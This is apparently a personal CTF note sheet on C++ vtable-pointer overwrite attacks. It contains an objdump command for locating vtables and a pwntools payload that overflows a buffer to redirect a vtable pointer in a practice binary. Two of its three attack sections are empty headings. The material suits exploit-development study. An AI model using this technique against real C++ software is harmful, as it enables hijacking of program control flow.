# C++

## get vtable
```
objdump -t ./vuln | c++filt | grep vtable
```

### Attack 1: override vtable pointer to other well-known vtable (31 santas-cookie, practice-6)
- works if no pie and well-known vtable position (or leak .data offset)
```python
# vuln has no pie so vtable is at well-known offset
# objdump -t ./vuln | c++filt | grep vtable
# currently there is this:
# 0000000000403db8  w    O .data.rel.ro	0000000000000018              vtable for Cookie
# we change to this:
# 0000000000403da0  w    O .data.rel.ro	0000000000000018              vtable for SantaSpecialCookie
vtable_SantaSpecialCookie = 0x0000000000403da0 + 16 # + 16 is the offset for decorate inside the vtable
payload = b'A'*64 + pwn.p64(vtable_SantaSpecialCookie)
conn.sendlineafter(b'Cookie decoration > ', payload)
```


### Attack 2: override vtable pointer to custom malicious vtable (32 calc)


### Attack 3: override function pointer in vtable



